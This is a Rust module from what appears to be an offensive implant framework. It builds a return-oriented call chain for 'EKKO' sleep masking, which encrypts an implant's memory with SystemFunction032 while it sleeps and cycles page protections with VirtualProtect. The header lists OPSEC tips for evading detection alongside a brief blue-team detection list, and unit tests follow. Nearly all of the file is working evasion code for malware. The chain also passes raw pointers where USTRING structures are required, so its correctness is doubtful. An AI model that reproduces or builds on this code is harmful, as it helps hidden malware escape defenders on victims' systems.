//! ROP chain construction for sleep masking
//!
//! Builds Return-Oriented Programming chains for the EKKO sleep masking
//! technique. Uses gadgets from ntdll to chain VirtualProtect and
//! SystemFunction032 calls.
//!
//! ## Technique
//! The ROP chain executes:
//! 1. VirtualProtect(base, size, PAGE_READWRITE, &old) - make writable
//! 2. SystemFunction032(data, key) - XOR encrypt
//! 3. WaitForSingleObject(event, sleep_time) - sleep
//! 4. SystemFunction032(data, key) - XOR decrypt
//! 5. VirtualProtect(base, size, PAGE_EXECUTE_READ, &old) - restore
//!
//! ## OPSEC Considerations
//! - ROP chain in memory is detectable signature
//! - Encrypt ROP chain, decrypt just before use
//! - Brief window of memory permission cycling
//!
//! ## Detection (Blue Team)
//! - Arrays of addresses pointing into ntdll .text
//! - Timer queue callbacks with unusual context
//! - CreateTimerQueueTimer from non-service process

use super::gadgets::GadgetCache;
use common::KrakenError;

/// ROP frame - a single return address with optional arguments
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct RopFrame {
    /// Function or gadget address to return to
    pub address: usize,
    /// Shadow space and arguments (Windows x64 calling convention)
    pub shadow_space: [usize; 4],
    /// Additional stack arguments if needed
    pub extra_args: [usize; 4],
}

impl RopFrame {
    pub fn new(address: usize) -> Self {
        Self {
            address,
            shadow_space: [0; 4],
            extra_args: [0; 4],
        }
    }

    pub fn with_args(address: usize, rcx: usize, rdx: usize, r8: usize, r9: usize) -> Self {
        Self {
            address,
            shadow_space: [rcx, rdx, r8, r9],
            extra_args: [0; 4],
        }
    }
}

/// Complete ROP chain for EKKO sleep masking
#[cfg(target_os = "windows")]
#[derive(Debug)]
pub struct EkkoRopChain {
    /// Frames to execute in order
    frames: Vec<RopFrame>,
    /// Total size of chain in bytes
    pub size: usize,
}

#[cfg(target_os = "windows")]
impl EkkoRopChain {
    /// Build EKKO ROP chain for sleep masking
    ///
    /// # Arguments
    /// * `gadgets` - Cached gadget addresses
    /// * `image_base` - Base address of memory to encrypt
    /// * `image_size` - Size of memory to encrypt
    /// * `sleep_ms` - Sleep duration in milliseconds
    /// * `key_ptr` - Pointer to encryption key
    /// * `key_len` - Length of encryption key
    /// * `event_handle` - Event handle for WaitForSingleObject
    /// * `old_protect_ptr` - Pointer to store old protection
    pub fn build(
        gadgets: &GadgetCache,
        virtual_protect: usize,
        system_function032: usize,
        wait_for_single_object: usize,
        image_base: usize,
        image_size: usize,
        sleep_ms: u32,
        key_ptr: usize,
        key_len: usize,
        event_handle: usize,
        old_protect_ptr: usize,
    ) -> Result<Self, KrakenError> {
        if !gadgets.has_required_gadgets() {
            return Err(KrakenError::Module("insufficient gadgets for ROP chain".into()));
        }

        let mut frames = Vec::with_capacity(5);

        // Windows memory protection constants
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_EXECUTE_READ: u32 = 0x20;

        // Frame 1: VirtualProtect(base, size, PAGE_READWRITE, &old)
        frames.push(RopFrame::with_args(
            virtual_protect,
            image_base,
            image_size,
            PAGE_READWRITE as usize,
            old_protect_ptr,
        ));

        // Frame 2: SystemFunction032(data_struct, key_struct)
        // SystemFunction032 takes two USTRING structures
        // We'll set this up with pointers to our structures
        frames.push(RopFrame::with_args(
            system_function032,
            image_base, // data (will be cast to USTRING*)
            key_ptr,    // key (will be cast to USTRING*)
            0,
            0,
        ));

        // Frame 3: WaitForSingleObject(event, sleep_time)
        frames.push(RopFrame::with_args(
            wait_for_single_object,
            event_handle,
            sleep_ms as usize,
            0,
            0,
        ));

        // Frame 4: SystemFunction032(data_struct, key_struct) - decrypt
        frames.push(RopFrame::with_args(
            system_function032,
            image_base,
            key_ptr,
            0,
            0,
        ));

        // Frame 5: VirtualProtect(base, size, PAGE_EXECUTE_READ, &old)
        frames.push(RopFrame::with_args(
            virtual_protect,
            image_base,
            image_size,
            PAGE_EXECUTE_READ as usize,
            old_protect_ptr,
        ));

        let size = frames.len() * std::mem::size_of::<RopFrame>();

        Ok(Self { frames, size })
    }

    /// Get raw pointer to chain for timer callback
    pub fn as_ptr(&self) -> *const RopFrame {
        self.frames.as_ptr()
    }

    /// Number of frames in chain
    pub fn frame_count(&self) -> usize {
        self.frames.len()
    }
}

/// USTRING structure for SystemFunction032
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct UString {
    pub length: u32,
    pub maximum_length: u32,
    pub buffer: *mut u8,
}

impl UString {
    pub fn new(buffer: *mut u8, length: usize) -> Self {
        Self {
            length: length as u32,
            maximum_length: length as u32,
            buffer,
        }
    }
}

// Non-Windows stubs
#[cfg(not(target_os = "windows"))]
#[derive(Debug)]
pub struct EkkoRopChain {
    pub size: usize,
}

#[cfg(not(target_os = "windows"))]
impl EkkoRopChain {
    pub fn build(
        _gadgets: &GadgetCache,
        _virtual_protect: usize,
        _system_function032: usize,
        _wait_for_single_object: usize,
        _image_base: usize,
        _image_size: usize,
        _sleep_ms: u32,
        _key_ptr: usize,
        _key_len: usize,
        _event_handle: usize,
        _old_protect_ptr: usize,
    ) -> Result<Self, KrakenError> {
        Err(KrakenError::Module("ROP chains only supported on Windows".into()))
    }

    pub fn as_ptr(&self) -> *const RopFrame {
        std::ptr::null()
    }

    pub fn frame_count(&self) -> usize {
        0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rop_frame_size() {
        // Frame should be properly sized for stack alignment
        let frame_size = std::mem::size_of::<RopFrame>();
        assert!(frame_size >= 8); // At least address size
    }

    #[test]
    fn test_rop_frame_new() {
        let frame = RopFrame::new(0x12345678);
        assert_eq!(frame.address, 0x12345678);
        assert_eq!(frame.shadow_space, [0, 0, 0, 0]);
    }

    #[test]
    fn test_rop_frame_with_args() {
        let frame = RopFrame::with_args(0x1000, 0x10, 0x20, 0x30, 0x40);
        assert_eq!(frame.address, 0x1000);
        assert_eq!(frame.shadow_space[0], 0x10);
        assert_eq!(frame.shadow_space[1], 0x20);
        assert_eq!(frame.shadow_space[2], 0x30);
        assert_eq!(frame.shadow_space[3], 0x40);
    }

    #[test]
    fn test_ustring_new() {
        let mut buffer = [0u8; 16];
        let ustring = UString::new(buffer.as_mut_ptr(), 16);
        assert_eq!(ustring.length, 16);
        assert_eq!(ustring.maximum_length, 16);
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_rop_chain_non_windows() {
        let gadgets = GadgetCache::build();
        let result = EkkoRopChain::build(
            &gadgets, 0, 0, 0, 0, 0, 1000, 0, 0, 0, 0
        );
        assert!(result.is_err());
    }
}
